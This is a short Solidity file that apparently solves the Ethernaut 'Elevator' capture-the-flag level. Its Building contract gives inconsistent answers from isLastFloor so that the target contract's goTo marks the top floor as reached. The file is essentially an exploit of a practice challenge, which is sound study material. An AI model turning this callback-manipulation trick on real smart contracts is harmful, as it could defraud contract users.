// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface Elevator {
    function goTo(uint _floor) external;
    function floor() external returns (uint) ;
}

contract Building {
    Elevator elevator;
    bool toggle;
    constructor(address _elevator){
        elevator = Elevator(_elevator); 
    }

    function isLastFloor(uint) external returns (bool){
        if(!toggle){
            toggle = true;
            return false;
        }
        else {
            toggle = false;
            return true;
        }
    }

    function callGoTo() external {
        elevator.goTo(3);
    }
}
